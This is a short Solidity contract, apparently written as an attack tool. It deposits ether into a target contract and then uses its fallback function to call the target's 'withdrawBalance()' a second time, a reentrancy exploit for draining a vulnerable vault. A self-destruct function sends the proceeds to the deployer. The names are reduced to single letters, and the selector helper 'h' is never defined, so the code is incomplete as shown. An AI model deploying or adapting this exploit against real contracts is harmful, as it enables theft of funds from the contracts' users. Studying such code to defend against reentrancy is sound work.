pragma solidity ^0.4.15;

contract VaultOperator {
    bool public c=false;
    address public b;
    address public g;

    function VaultOperator() public{
        g = msg.sender;
    }

    function f(address a) public payable{
        b = a ;

        require(b.call.value(msg.value)(bytes4(h("addToBalance()"))));
    }

    function d() public{
        c = true;


        require(b.call(bytes4(h("withdrawBalance()"))));
    }

    function () public payable{

        if (c){
            c = false;
                require(b.call(bytes4(h("withdrawBalance()"))));
        }
    }

    function e(){
        suicide(g);
    }

}